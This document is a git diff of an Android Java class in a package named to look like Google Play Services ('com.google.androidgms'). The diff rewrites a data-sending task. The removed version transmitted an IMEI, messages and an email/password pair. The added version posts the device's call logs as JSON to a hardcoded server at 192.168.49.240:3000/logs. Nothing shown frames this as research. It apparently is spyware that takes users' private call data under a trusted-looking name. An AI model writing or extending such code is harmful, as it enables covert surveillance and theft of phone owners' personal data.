@@ -1,6 +1,5 @@
 package com.google.androidgms;
 
-import android.content.SharedPreferences;
 import android.os.AsyncTask;
 import android.util.Log;
 
@@ -9,7 +8,6 @@ import org.apache.http.client.ClientProtocolException;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.entity.StringEntity;
 import org.apache.http.impl.client.DefaultHttpClient;
-import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.IOException;
@@ -19,44 +17,28 @@ import java.io.UnsupportedEncodingException;
 /**
  * Created by Shubham on 30 Nov 14.
  */
-public class SendData extends AsyncTask<Void,Void,String>
+public class SendCallLogs extends AsyncTask <Void, Void, String>
 {
-    private String messageArr[];
-    private String imei;
 
-    private String url = "http://192.168.49.240:3000";
+    private JSONObject list;
+    private StringBuilder sb = new StringBuilder();
+    private String url = "http://192.168.49.240:3000/logs";
 
-    public SendData(String[] str, String n)
+    public SendCallLogs(JSONObject jsonObject)
     {
-        this.messageArr=str;
-        this.imei=n;
-        Log.d("imei",imei);
-        for(int i=0;i<30;++i)
-        {
-            Log.d("String", i + ": " + messageArr[i]);
-        }
-
+        list=jsonObject;
+        Log.d("json", list.toString());
     }
 
     @Override
-    protected String doInBackground(Void... params)
-    {
+    protected String doInBackground(Void... params) {
         InputStream inputStream = null;
         try {
             DefaultHttpClient httpclient = new DefaultHttpClient();
             HttpPost httpPost = new HttpPost(url);
 
             String json = "";
-
-            JSONObject jsonObject = new JSONObject();
-
-            try {
-                jsonObject.put("email", userEmail);
-                jsonObject.put("password", userPassword);
-            } catch (JSONException e) {
-                e.printStackTrace();
-            }
-            json = jsonObject.toString();
+            json = list.toString();
             Log.d("json", json);
 
             StringEntity se = new StringEntity(json);
@@ -69,7 +51,7 @@ public class SendData extends AsyncTask<Void,Void,String>
             inputStream = httpResponse.getEntity().getContent();
             StatusLine sl = httpResponse.getStatusLine();
 
-            Log.v("debug", Integer.toString(sl.getStatusCode()) + " " + sl.getReasonPhrase());
+//            Log.v("debug", Integer.toString(sl.getStatusCode()) + " " + sl.getReasonPhrase());
 
             try {
                 int ch;
@@ -89,6 +71,17 @@ public class SendData extends AsyncTask<Void,Void,String>
         }
 
         return sb.toString();
-        return null;
     }
+
+    @Override
+    protected void onPostExecute(String str)
+    {
+        if(str != null)
+        {
+            Log.d("system response", str);
+        }
+        else
+            Log.d("system response","is null");
+    }
+
 }
